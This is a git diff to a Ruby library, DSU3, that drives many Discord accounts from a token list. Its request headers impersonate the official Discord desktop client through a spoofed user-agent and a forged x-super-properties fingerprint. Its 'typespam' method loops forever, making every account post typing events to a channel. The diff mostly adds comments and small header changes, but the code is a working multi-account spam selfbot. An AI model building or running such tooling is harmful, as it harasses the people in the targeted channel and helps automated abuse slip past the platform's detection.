@@ -6,11 +6,14 @@ require 'json'
 require 'dsu3/bot'
 
 module DSU3
+  # All DSU3 functionality, used to manage multiple bots
   class Core
+    # user-agent header
     USER_AGENT =
       'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '\
       'discord/0.0.18 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36'
 
+    # Decoded x-super-properties header
     SUPER_PROPERTIES = {
       os: 'Linux',
       browser: 'Discord Client',
@@ -25,6 +28,7 @@ module DSU3
       client_event_source: nil
     }.freeze
 
+    # Main headers
     HEADERS = {
       accept: '*/*',
       accept_encoding: 'gzip, deflate, br',
@@ -34,15 +38,18 @@ module DSU3
       sec_fetch_site: 'same-origin',
       user_agent: USER_AGENT,
       x_debug_options: 'bugReporterEnabled',
-      x_discord_locale: 'en',
+      x_discord_locale: 'en-US',
       x_super_properties: Base64.strict_encode64(SUPER_PROPERTIES.to_json)
     }.freeze
-
+ 
+    # @param [Array] tokens List of bot tokens
     def initialize(tokens)
       headers = get_headers
       @bots = tokens.map { |token| Bot.new(headers.merge(authorization: token)) }
     end
 
+    # Infinitely types in a certain channel
+    # @param [String, Integer] channel Channel id
     def typespam(channel)
       loop do
         @bots.each { |bot| bot.request(:post, "channels/#{channel}/typing") }
@@ -53,7 +60,7 @@ module DSU3
     private
 
     def get_headers
-      resp = RestClient.get('https://discord.com/api/v9/experiments')
+      resp = RestClient.get('https://discord.com/api/v9/experiments', HEADERS)
 
       {
         cookie: HTTP::Cookie.cookie_value(resp.cookie_jar.cookies),
